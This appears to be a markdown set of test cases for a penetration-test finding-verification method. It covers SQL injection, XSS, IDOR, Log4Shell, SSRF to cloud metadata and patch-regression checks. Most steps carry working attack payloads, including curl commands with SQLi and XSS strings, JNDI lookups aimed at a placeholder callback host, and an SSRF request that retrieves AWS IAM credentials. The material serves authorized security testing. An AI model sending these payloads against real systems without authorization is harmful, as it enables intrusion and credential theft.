# Verification Loop — Test Cases

> Structured test scenarios for multi-phase finding verification methodology.

---

## TC-VL-001: SQL Injection Verification

### Scenario
A web application contact form parameter returns a SQL error when a single quote is appended. Verify this is a genuine SQL injection vulnerability using the six-phase verification process.

### Pre-conditions
- Target URL and parameter identified
- Scope authorization confirmed
- sqlmap, curl available

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Define success criteria: database error or data exfiltration confirmed
   - Record baseline: normal response for `?id=1`
   - Set revert plan: no system changes expected (read-only test)

2. **Phase 2: Execute & Observe**
   ```bash
   curl -v "http://target/page?id=1'" 2>&1 | tee evidence/sqli-attempt.txt
   ```

3. **Phase 3: Post-Condition Check**
   - Compare response to baseline
   - Check for SQL error messages (syntax error, unclosed quote, database name)
   - Measure response differences

4. **Phase 4: Independent Confirmation**
   ```bash
   # Different tool — sqlmap
   sqlmap -u "http://target/page?id=1" --batch --dbs

   # Different payload — UNION-based
   curl -s "http://target/page?id=1 UNION SELECT NULL,NULL--"
   ```

5. **Phase 5: False Positive Elimination**
   - Is this WAF returning generic errors? Test without quotes
   - Is this a prepared statement error (safe)? Check if data is actually returned
   - Test with different parameter values

6. **Phase 6: Evidence Documentation**
   - Compile all evidence into verification report
   - Include original finding, confirmation, FP analysis, final verdict

### Expected Outcomes

| Phase | Result |
|-------|--------|
| Pre-condition | Baseline captured, success criteria defined |
| Execute | SQL error or unexpected behavior observed |
| Post-condition | Response differs from baseline measurably |
| Independent | Confirmed with sqlmap AND manual curl |
| FP elimination | Not environment-specific, not tool artifact |
| Evidence | Complete verification report with CONFIRMED verdict |

---

## TC-VL-002: XSS Verification

### Scenario
A reflected XSS finding from an automated scanner needs verification. The scanner reported that the `search` parameter reflects input without encoding.

### Pre-conditions
- Scanner report with URL and parameter
- Browser with DevTools available
- curl for command-line confirmation

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Success criteria: arbitrary HTML/JS rendered in browser context
   - Baseline: normal search response

2. **Phase 2: Execute & Observe**
   ```bash
   curl -s "http://target/search?q=<script>alert(1)</script>" > evidence/xss-raw.html
   grep -i "<script>alert(1)</script>" evidence/xss-raw.html
   ```

3. **Phase 3: Post-Condition Check**
   - Is the payload reflected unmodified in the response body?
   - What context does it appear in (HTML body, attribute, JavaScript)?

4. **Phase 4: Independent Confirmation**
   ```bash
   # Different vector
   curl -s "http://target/search?q=<img src=x onerror=alert(1)>"

   # Browser test (manual)
   # Open in browser, check if alert fires
   ```

5. **Phase 5: False Positive Elimination**
   - Does it work in multiple browsers?
   - Is Content-Security-Policy blocking execution?
   - Is the payload actually rendered or just present in source?
   - Does it require authentication?

6. **Phase 6: Evidence Documentation**
   - Screenshot of alert firing in browser
   - HTTP request/response capture
   - CSP header analysis

### Expected Outcomes

| Phase | Result |
|-------|--------|
| Execute | Payload reflected in response HTML |
| Independent | Confirmed with different vector AND browser |
| FP elimination | Works without authentication, CSP allows execution |
| Evidence | Screenshot + HTTP capture + CONFIRMED verdict |

---

## TC-VL-003: Authentication Bypass Verification

### Scenario
An IDOR vulnerability is reported: User A can access User B's profile by changing the user ID in the API URL.

### Pre-conditions
- Two test accounts available (User A and User B)
- API endpoint identified
- Valid session tokens for both accounts

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Success criteria: User A retrieves User B's private data
   - Baseline: User A's own profile data
   - Revert plan: no changes, read-only access test

2. **Phase 2: Execute & Observe**
   ```bash
   # Access User B's profile as User A
   curl -s -H "Authorization: Bearer <user_A_token>" \
     http://target/api/users/2/profile | tee evidence/idor-attempt.json
   ```

3. **Phase 3: Post-Condition Check**
   - Compare response to User B's actual profile data
   - Verify returned data is User B's private information

4. **Phase 4: Independent Confirmation**
   ```bash
   # Method 1: Different endpoint
   curl -s -H "Authorization: Bearer <user_A_token>" \
     http://target/api/users/2/settings

   # Method 2: POST/PUT (write test)
   curl -s -X PUT -H "Authorization: Bearer <user_A_token>" \
     -d '{"email":"test@test.com"}' \
     http://target/api/users/2/profile
   ```

5. **Phase 5: False Positive Elimination**
   - Is the data actually private or publicly accessible?
   - Does the API return the same data for unauthenticated requests?
   - Is the IDOR limited to specific endpoints?

6. **Phase 6: Evidence Documentation**
   - Capture both User A and User B perspectives
   - Document read vs write impact

### Expected Outcomes

| Phase | Result |
|-------|--------|
| Execute | User B's private data returned to User A |
| Independent | Confirmed on multiple endpoints |
| FP elimination | Data is private, requires auth but not authorization |
| Evidence | Full request/response capture + CONFIRMED verdict |

---

## TC-VL-004: Scanner Result Verification

### Scenario
Nessus/Nuclei scanner reported CVE-2021-44228 (Log4Shell) on a Java web application. Verify the finding is genuine.

### Pre-conditions
- Scanner report with CVE ID and affected host
- Target accessible on reported port
- LDAP/DNS callback server available (e.g., interactsh)

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Success criteria: target connects to callback server via JNDI lookup
   - Baseline: no unexpected outbound connections from target

2. **Phase 2: Execute & Observe**
   ```bash
   # Start callback listener
   interactsh-client

   # Send Log4Shell payload
   curl -s -H "X-Api-Version: \${jndi:ldap://<callback>/test}" \
     http://target/api/health

   # Check callback logs for connection from target IP
   ```

3. **Phase 3: Post-Condition Check**
   - Did the target IP connect to the callback server?
   - What was the timing between request and callback?

4. **Phase 4: Independent Confirmation**
   ```bash
   # Different payload format
   curl -s -H "User-Agent: \${jndi:dns://<callback>/ua}" \
     http://target/api/health

   # Different injection point
   curl -s "http://target/api/search?q=\${jndi:ldap://<callback>/q}"
   ```

5. **Phase 5: False Positive Elimination**
   - Is this version-matched only (no actual exploitation)?
   - Is Log4j actually in the classpath?
   - Is the WAF blocking but returning 200?

6. **Phase 6: Evidence Documentation**
   - Callback server logs showing target connection
   - HTTP request that triggered callback
   - Log4j version confirmation

### Expected Outcomes

| Phase | Result |
|-------|--------|
| Execute | Callback received from target IP |
| Independent | Confirmed via different injection point |
| FP elimination | Log4j confirmed in classpath, not just version match |
| Evidence | Callback logs + request capture + CONFIRMED verdict |

---

## TC-VL-005: Remediation Verification

### Scenario
A previously confirmed SQL injection vulnerability has been patched. Verify the fix is complete and no bypasses exist.

### Pre-conditions
- Original finding report available
- Original and variant payloads documented
- Target accessible for testing

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Success criteria: ALL original payloads now fail
   - Baseline: original finding evidence

2. **Phase 2: Execute Original Payload**
   ```bash
   # Re-test original payload (should fail)
   curl -s "http://target/page?id=1' OR 1=1--"
   curl -s "http://target/page?id=1' UNION SELECT NULL--"
   ```

3. **Phase 3: Post-Condition Check**
   - Are payloads blocked, sanitized, or returning errors?
   - No data leakage in any response?

4. **Phase 4: Test Variant Bypasses**
   ```bash
   # Encoding bypasses
   curl -s "http://target/page?id=1%27%20OR%201%3D1--"
   curl -s "http://target/page?id=1'/**/OR/**/1=1--"

   # Different SQLi types
   sqlmap -u "http://target/page?id=1" --batch --level=5 --risk=3
   ```

5. **Phase 5: Completeness Check**
   - Are other parameters on the same endpoint also fixed?
   - Are similar endpoints (same code pattern) also fixed?
   - Does the fix handle all HTTP methods (GET, POST, PUT)?

6. **Phase 6: Document Result**
   - PATCHED: all payloads fail
   - PARTIALLY PATCHED: some payloads still work
   - NOT PATCHED: original payload still works

### Expected Outcomes

| Phase | Result |
|-------|--------|
| Original payload | Blocked or sanitized |
| Variant bypasses | All blocked |
| SQLmap comprehensive | No injection found |
| Completeness | All related endpoints verified |
| Verdict | PATCHED / PARTIALLY PATCHED / NOT PATCHED |

---

## TC-VL-006: Multi-Round Verification

### Scenario
A complex vulnerability (chained SSRF leading to cloud metadata access) requires multiple verification rounds with escalating payload sophistication. Initial confirmation succeeds, but the full impact chain needs independent validation at each stage.

### Pre-conditions
- Target web application with URL-fetching functionality
- Cloud-hosted target (AWS/GCP) with metadata API reachable from SSRF
- interactsh or Burp Collaborator for out-of-band callbacks
- Three verification agents available (or three independent passes)

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Success criteria: (a) SSRF confirmed via callback, (b) cloud metadata returned, (c) IAM credentials exfiltrated
   - Baseline: normal URL fetch returns expected content
   - Define round thresholds: Round 1 = confirm SSRF, Round 2 = confirm metadata, Round 3 = confirm credential access

2. **Round 1: Initial SSRF Confirmation**
   ```bash
   # Start callback server
   interactsh-client &

   # Test basic SSRF
   curl -s -X POST "http://target/api/fetch" \
     -d '{"url": "http://<callback>/ssrf-test"}'
   ```
   - Verify callback received from target IP
   - Record response time, source IP, and User-Agent

3. **Round 2: Cloud Metadata Access**
   ```bash
   # AWS IMDSv1 test
   curl -s -X POST "http://target/api/fetch" \
     -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

   # AWS IMDSv2 test (if IMDSv1 blocked)
   # First get a token
   curl -s -X POST "http://target/api/fetch" \
     -d '{"url": "http://169.254.169.254/latest/api/token", "method": "PUT", "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}}'
   ```
   - Verify IAM role name returned
   - Cross-validate: both direct fetch and callback-based approaches confirm metadata access

4. **Round 3: Full Chain Validation**
   ```bash
   # Attempt to retrieve temporary credentials
   curl -s -X POST "http://target/api/fetch" \
     -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"}'
   ```
   - Verify response contains AccessKeyId, SecretAccessKey, Token
   - **STOP**: do not use credentials — document only

5. **Phase 5: False Positive Elimination**
   - Is this a honeypot returning fake metadata? Compare response structure to real AWS IMDS
   - Is this cached content from a previous test? Add unique identifiers to each request
   - Is the cloud metadata actually sensitive, or is this a non-production role with no permissions?

6. **Phase 6: Evidence Documentation**
   - Compile three-round verification report
   - Each round must show: payload used, response received, independent confirmation method
   - Final verdict: CONFIRMED with full chain, PARTIAL if metadata only, FALSE POSITIVE if no SSRF

### Expected Outcomes

| Round | Objective | Result |
|-------|-----------|--------|
| Round 1 | SSRF confirmed via callback | Callback received from target IP |
| Round 2 | Cloud metadata accessible | IAM role name returned |
| Round 3 | Full chain validated | Temporary credentials returned (documented, not used) |
| FP elimination | Not cached, not honeypot | Unique response per request, matches real IMDS format |
| Evidence | Three-round report with CONFIRMED verdict | Complete chain documented |

---

## TC-VL-007: Cross-Skill Result Validation

### Scenario
Two different security skills (Network Pentest and Web Application Testing) independently discover overlapping findings for the same target. Validate that results are consistent across skills and identify any discrepancies that indicate false positives in either skill.

### Pre-conditions
- Target with both network services and web application
- Network Pentest agent completed scanning (nmap, nikto)
- Web Application Testing agent completed assessment (Burp, manual testing)
- Both skill results available in standardized format
- Access to both sets of raw evidence files

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Success criteria: overlapping findings are consistent, discrepancies are explained
   - Collect both result sets and normalize to common format

2. **Phase 2: Result Correlation**
   ```bash
   # Extract open ports from network scan
   nmap -sV -sC target.lab | grep "open" > network-services.txt

   # Extract web findings from web assessment
   cat web-findings.json | jq -r '.[] | "\(.title) - \(.url) - \(.severity)"' > web-findings.txt

   # Cross-correlate: if network scan shows HTTP on port 80 but web scan shows it as closed
   # that is a discrepancy requiring investigation
   ```

3. **Phase 3: Overlap Analysis**
   - Map network services to web findings: does every open HTTP port have corresponding web findings?
   - Map web findings to network services: does every web finding correspond to a confirmed open port?
   - Identify discrepancies:
     - Network scan reports service X, web scan does not cover it
     - Web scan reports vulnerability on port Y, but network scan shows port Y closed
     - Severity differs between the two assessments for the same finding

4. **Phase 4: Independent Re-verification of Discrepancies**
   ```bash
   # For each discrepancy, run a targeted third verification
   # Example: network says port 8443 is open, web scan missed it
   nmap -p 8443 -sV target.lab
   curl -sk https://target.lab:8443/ -o /dev/null -w "HTTP:%{http_code}\n"
   nikto -h https://target.lab:8443/
   ```

5. **Phase 5: False Positive Identification**
   - Discrepancies may indicate: (a) one skill has false positives, (b) timing difference (service went down between scans), (c) scope gap (one skill did not cover that endpoint)
   - For each discrepancy, determine root cause and document

6. **Phase 6: Evidence Documentation**
   - Produce cross-skill validation matrix:

### Expected Outcomes

| Correlation Check | Expected Result |
|-------------------|-----------------|
| Network services vs web findings | All open HTTP ports have corresponding web assessment entries |
| Web findings vs network services | All web findings reference confirmed-open ports |
| Severity consistency | Same vulnerability rated similarly across skills (+/- 1 level) |
| Discrepancies resolved | Each discrepancy explained with root cause |
| Coverage gaps | Any endpoint missed by both skills flagged as gap |

| Finding | Network Skill | Web Skill | Status |
|---------|---------------|-----------|--------|
| SSH on port 22 | Confirmed | N/A | Consistent (web skill scope excludes non-HTTP) |
| SQLi on /search | N/A | Confirmed | Consistent (network skill does not test web logic) |
| HTTP on 8443 | Open, HTTPS | Not tested | Discrepancy — web skill gap |
| XSS on /login | N/A | Medium | N/A (web-only finding) |

---

## TC-VL-008: Automated Regression Verification

### Scenario
A web application has undergone three rounds of remediation for a set of 12 vulnerabilities. Run automated regression testing to verify all patches hold while also testing for new bypass variants introduced by the fixes.

### Pre-conditions
- Original vulnerability report with 12 findings (documented payloads and expected blocked behavior)
- Remediation report from development team
- Target application accessible for retesting
- sqlmap, Burp Suite, curl available
- Baseline from TC-VL-005 available for reference

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Success criteria: all 12 original payloads fail, no new bypass variants succeed
   - Load original finding set with payloads and endpoints

2. **Phase 2: Automated Original Payload Replay**
   ```bash
   # Replay all original payloads and record results
   while IFS=',' read -r finding_id endpoint payload expected_blocked; do
     response=$(curl -s -w "\n%{http_code}" "$endpoint" -d "param=$payload")
     http_code=$(echo "$response" | tail -1)
     echo "$finding_id,$http_code,$expected_blocked" >> regression-results.csv
   done < original-payloads.csv

   # Check for any regressions (previously blocked, now unblocked)
   grep -v ",403,blocked\|,400,blocked\|,401,blocked" regression-results.csv | grep "blocked" > regressions.txt
   ```

3. **Phase 3: Bypass Variant Generation and Testing**
   ```bash
   # For each original SQL injection, generate and test 5 encoding variants
   sqlmap -u "http://target/page?id=1" --batch --tamper=space2comment,between,randomcase --level=3

   # For XSS findings, test modern bypass vectors
   for payload in '<img/src=x onerror=alert(1)>' '<svg/onload=alert(1)>' '{{7*7}}' '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">' 'javascript:alert(1)'; do
     curl -s "http://target/search?q=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("'"'$payload'"'"))')" | grep -i "alert(1)"
   done
   ```

4. **Phase 4: New Endpoint Coverage**
   - Verify that fixes were applied to ALL endpoints sharing the same code pattern, not just the originally reported endpoint
   ```bash
   # Find all endpoints using the same parameter pattern
   ffuf -u "http://target/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200 | tee new-endpoints.txt

   # Test each new endpoint with original payload patterns
   for endpoint in $(cut -d' ' -f1 new-endpoints.txt); do
     curl -s "$endpoint?id=1'+OR+1=1--" | grep -iE "error|syntax|sql" && echo "REGRESSION: $endpoint"
   done
   ```

5. **Phase 5: Regression Trend Analysis**
   - Compare results across remediation rounds:
     - Round 1: 12 vulnerabilities found
     - Round 2: 3 remaining (partial fix)
     - Round 3: 0 original + 0 new variants = PASS
   - Flag any finding that regresses (was blocked in Round 2 but unblocked in Round 3)

6. **Phase 6: Evidence Documentation**
   - Generate regression report:

### Expected Outcomes

| Check | Expected Result |
|-------|-----------------|
| Original payload replay | All 12 payloads return blocked/sanitized (400/403/empty response) |
| Bypass variants | All encoding and modern bypass variants also blocked |
| New endpoint coverage | No new endpoints share the vulnerable pattern unfixed |
| Regression trend | Monotonic decrease in findings across rounds (no regressions) |
| Automated pass/fail | PASS: 0 regressions, 0 new variants. FAIL: any regression or new variant |

| Finding ID | Original Status | Round 2 | Round 3 (Current) | Verdict |
|------------|----------------|---------|-------------------|---------|
| SQLI-001 | Confirmed | Blocked | Blocked | PASS |
| XSS-002 | Confirmed | Blocked | Blocked | PASS |
| IDOR-003 | Confirmed | Still present | Blocked | PASS (fixed in R3) |
| SSRF-004 | Confirmed | Blocked | Blocked | PASS |
